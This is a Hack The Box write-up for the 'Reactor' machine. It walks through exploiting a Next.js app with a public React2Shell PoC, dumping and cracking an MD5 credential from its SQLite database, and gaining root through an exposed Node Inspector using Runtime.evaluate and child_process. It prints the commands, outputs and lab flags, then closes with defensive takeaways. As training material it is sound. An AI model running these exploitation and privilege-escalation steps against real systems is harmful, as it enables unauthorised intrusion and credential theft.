# Reactor — Hack The Box Write-up

## Introduction

Reactor is a Linux box where the initial foothold comes from a vulnerable Next.js application. The interesting part is that the first RCE only gives access as the application's `node` user. From there, the path moves through the application's SQLite database, SSH, and finally a root-owned Node.js process with its Inspector enabled.

The complete path is:

```text
Next.js 15.0.3
    ↓
React2Shell
    ↓
RCE as node
    ↓
reactor.db
    ↓
MD5 hash
    ↓
engineer / reactor1
    ↓
SSH
    ↓
Node Inspector on 127.0.0.1:9229
    ↓
Runtime.evaluate()
    ↓
root
```

---

## 1. Recon

I started with a full TCP scan:

```bash
nmap -Pn -p- --min-rate 5000 -oN nmap-all.txt 10.129.245.214
```

The scan reported SSH on port 22. It also showed a large number of filtered ports and a retransmission warning, so I didn't want to assume that SSH was the only interesting service.

I checked port 3000 directly:

```bash
nmap -Pn -p3000 -sC -sV 10.129.245.214
```

This came back as an HTTP service powered by Next.js.

```text
3000/tcp open
X-Powered-By: Next.js
```

WhatWeb gave the application name:

```bash
whatweb http://10.129.245.214:3000
```

```text
Title[ReactorWatch | Core Monitoring System]
X-Powered-By[Next.js]
```

At this point, the web application was clearly the main lead.

---

## 2. React2Shell

The application was running an old enough Next.js/React combination to make React2Shell worth testing.

I cloned the PoC and ran its detection mode first:

```bash
git clone https://github.com/freeqaz/react2shell.git
cd react2shell
chmod +x detect.sh exploit-redirect.sh

./detect.sh http://10.129.245.214:3000
```

The detector returned:

```text
HTTP Status: 500
VULNERABLE - Server returned 500 with E{"digest" pattern
```

That was enough to move from detection to a controlled command execution test.

```bash
./exploit-redirect.sh http://10.129.245.214:3000 "id"
```

Result:

```text
uid=999(node) gid=988(node) groups=988(node)
```

So the application was remotely executing commands as `node`.

A couple of basic checks confirmed the context:

```bash
./exploit-redirect.sh http://10.129.245.214:3000 "whoami"
./exploit-redirect.sh http://10.129.245.214:3000 "pwd"
```

```text
node
/opt/reactor-app
```

---

## 3. Looking at the application

The application directory was:

```text
/opt/reactor-app
```

Listing it showed an `.env` file and, more importantly, `reactor.db`:

```bash
./exploit-redirect.sh http://10.129.245.214:3000 "ls -la /opt/reactor-app"
```

The database was readable by the `node` user:

```bash
./exploit-redirect.sh http://10.129.245.214:3000 "ls -l /opt/reactor-app/reactor.db"
```

The database contained two tables:

```bash
./exploit-redirect.sh http://10.129.245.214:3000 "sqlite3 /opt/reactor-app/reactor.db '.tables'"
```

```text
sensor_logs  users
```

The schema was the interesting part:

```bash
./exploit-redirect.sh http://10.129.245.214:3000 "sqlite3 /opt/reactor-app/reactor.db '.schema'"
```

```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
);
```

So instead of spending time trying to turn the application RCE into a shell, I had a much cleaner route to a real local account: recover a credential from the database.

---

## 4. Cracking the password

The hash associated with `engineer` was:

```text
39d97110eafe2a9a68639812cd271e8e
```

I first checked the likely hash formats:

```bash
hashcat --identify '39d97110eafe2a9a68639812cd271e8e'
```

MD5 was one of the matching formats.

I then used RockYou:

```bash
printf '%s
' '39d97110eafe2a9a68639812cd271e8e' > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

It cracked immediately:

```text
39d97110eafe2a9a68639812cd271e8e:reactor1
```

That gave me:

```text
engineer : reactor1
```

---

## 5. SSH

SSH was already exposed from the initial enumeration, so I tested the recovered credential:

```bash
ssh engineer@10.129.245.214
```

Login worked.

```bash
whoami
id
```

The account was:

```text
uid=1000(engineer)
```

The user flag was in the home directory:

```bash
cat /home/engineer/user.txt
```

```text
b2d3a4478c04d2ef8eb692a3a833966d
```

---

## 6. Privilege escalation enumeration

The first check was the usual one:

```bash
sudo -l
```

There was no sudo access.

The account was also a member of the `lxd` group:

```text
groups=...,101(lxd)
```

That looked promising at first, but LXD wasn't actually usable on this host. Running:

```bash
lxc --version
```

triggered an on-demand LXD installer which failed. There was no usable LXD socket or storage directory either.

So I moved on rather than forcing a dead end.

Process enumeration was much more useful:

```bash
ps aux | grep -E 'inspect|node'
```

The important process was:

```text
root  1382  ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

This immediately stood out.

A Node.js process owned by root was running with:

```text
--inspect=127.0.0.1:9229
```

The Inspector was only bound to localhost, but that didn't matter anymore because I already had a local shell as `engineer`.

---

## 7. Node Inspector

I checked the Inspector endpoint:

```bash
curl -s http://127.0.0.1:9229/json
```

It returned a WebSocket debugger URL.

The process was confirmed with:

```bash
ps -o user,pid,cmd -C node
```

```text
root 1382 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

The service itself was just an uptime monitor. Its source wasn't doing anything particularly interesting:

```javascript
const TARGET_URL = 'http://127.0.0.1:3000/';
```

It periodically requested the local application and wrote monitoring data to a log file.

The important thing wasn't the application logic. It was the fact that the root Node runtime had its Inspector enabled.

---

## 8. Connecting without installing anything

The box didn't have `websocket-client`, `websocat`, or `wscat`.

I briefly tried installing `ws` with npm, but the machine couldn't reach the npm registry:

```text
EAI_AGAIN registry.npmjs.org
```

Rather than modifying the environment, I wrote a tiny WebSocket client using Python's standard library.

The script performs the WebSocket upgrade and sends a Chrome DevTools Protocol request to:

```text
Runtime.evaluate
```

The first expression was intentionally harmless:

```javascript
process.getuid()
```

The response was:

```text
"value":0
```

That's the important proof.

The SSH account was UID 1000, but the JavaScript evaluation was happening in a process running as UID 0.

In other words:

```text
engineer
   ↓
127.0.0.1:9229
   ↓
Node Inspector
   ↓
Runtime.evaluate()
   ↓
root process
```

---

## 9. Getting root

Once the execution context was confirmed, Node's `child_process` module could be reached from the evaluated JavaScript.

The final expression was:

```javascript
process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()
```

The response:

```text
9ecf367da57997b30e687019ea07df75
```

Root obtained.

---

## 10. Final attack chain

The whole machine can be reduced to this:

```text
[Recon]
   │
   └── 3000/tcp → ReactorWatch / Next.js
                       │
                       ▼
                 [React2Shell]
                       │
                       ▼
                    node
                       │
                       ▼
                [reactor.db]
                       │
                       ▼
              engineer / MD5 hash
                       │
                       ▼
                  reactor1
                       │
                       ▼
                     SSH
                       │
                       ▼
                   engineer
                       │
                       ▼
             [Node Inspector]
                127.0.0.1:9229
                       │
                       ▼
               Runtime.evaluate()
                       │
                       ▼
                     root
```

---

## 11. Flags

### User

```text
b2d3a4478c04d2ef8eb692a3a833966d
```

### Root

```text
9ecf367da57997b30e687019ea07df75
```

---

## 12. Takeaways

The first scan could easily have led to the conclusion that SSH was the only useful service. The retransmission warning was a good reason to keep looking, and port 3000 turned out to be the actual entry point.

The web RCE itself was straightforward once the vulnerable Next.js deployment was identified. The more interesting part of the box came afterwards: the application database provided the SSH credential, while the final escalation relied on a root Node process exposing its debugging interface locally.

The LXD group was a distraction on this instance. The Node Inspector was the real escalation path.

From a defensive point of view, the main issues are straightforward:

- keep Next.js/React dependencies patched;
- don't leave Node Inspector enabled on production services;
- don't rely on localhost as an access-control boundary for privileged debugging interfaces;
- don't store passwords as unsalted MD5 hashes;
- keep application databases containing credentials inaccessible to the application runtime where possible.
